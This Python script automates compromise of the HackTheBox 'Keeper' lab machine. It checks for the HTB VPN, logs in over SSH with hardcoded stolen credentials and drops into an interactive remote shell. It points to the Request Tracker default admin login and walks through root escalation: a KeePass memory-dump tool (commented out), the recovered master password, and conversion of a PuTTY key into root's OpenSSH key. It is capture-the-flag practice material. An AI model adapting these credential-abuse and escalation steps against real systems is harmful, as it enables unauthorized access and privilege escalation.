import sys, os
import time as cm
import requests
import re
import subprocess
import paramiko
from threading import Thread
import time as cm
from colorama import Fore, init
from consolemenu import SelectionMenu

init(autoreset=True)

def banner():
    os.system("clear")
    bnn = """
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⣧⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣶⡀⠀⠀⢀⡴⠛⠁⠀⠘⣿⡄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⣤⡴⠋⠀⠀⠀⠀⠀⢿⣇⠀         ▓█████ ▄████▄   ██░ ██  ██ ▄█▀                       █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀         ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⣿⡀         ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇         ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇         ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄                       █
                  ⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇         ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒                       █
                  ⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀          ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░                       █
                  ⠀⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀          ░  ░         ░  ░░ ░░ ░░ ░                          █
                  ⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀          ___ ___ ___ ___                                     █
                  ⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀         (___|___|___|___)                                    █
                  ⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀         G1thub: https://github.com/l44x                      █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀         T4skT00l: Pw3ned-R00t [ Keeper ]                     █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀    ___ ___ ___ ___                                           █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀   (___|___|___|___)                                          █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠃                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    """
    print(Fore.GREEN + f"{bnn}")
    
global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.227"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print("----------------------------------------------------")
        print(Fore.CYAN + f"\t\t ~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t\t[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Path Exploit] > " + Fore.YELLOW + f"http://tickets.keeper.htb/")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked BoardLight Network")
        print("----------------------------------------------------\n")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

def unlocked():
    try:
        checker_status()
        user_default_hackthebox()
        while True:
            users=["lnorgaard", "root","exit"]
            client = paramiko.SSHClient()
            host = target_machine
            username = "lnorgaard"
            password = "Welcome2023!"
            print("----------------------------------------------------")
            print(Fore.MAGENTA + f"\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t\t ~ What ur user select? > "))
            print("----------------------------------------------------\n")
            if user_call == 1:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to lnorgaard:)]\n")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit Message - Credentials Path] > " + Fore.YELLOW + f"http://tickets.keeper.htb/rt/root:password")
                    print(Fore.RED + f"\t\t\t\t\t[Exploit Message - Credentials Path] > " + Fore.YELLOW + f"http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27")
                    print(Fore.RED + f"\t\t\t\t\t[Exploit Message - Connecting...] > " + Fore.GREEN + f"Successfully")
                    #init shell
                    shell = client.invoke_shell()
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        cm.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                    shell.close()
                    client.close()
                    print("----------------------------------------------------\n")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
                except:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
            elif user_call == 2:
                input(Fore.GREEN+"\t\t\t\t\t[Exploit Message] > " +Fore.CYAN+ "Press ENTER if u have file RT30000.zip"+Fore.YELLOW)
                commands_send("unzip RT30000.zip")
                #commands_send("git clone https://github.com/z-jxy/keepass_dump")
                #commands_send("python3 keepass_dump.py -f KeePassDumpFull.dmp --skip --debug")
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.RED + f"Use password: 'rødgrød med fløde' for enter passcodes.kdbx [keepass2, keepassxc]")
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.RED + f"Command for convert 'puttygen id_rsa.key.ppk -O private-openssh -o id_rsa' ")
                print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.RED + f"H4ppy H3cking :3")
                break
            elif user_call == 3:
                break
            else:
                break
    except:
        pass

if __name__ == '__main__':
    banner()
    unlocked()
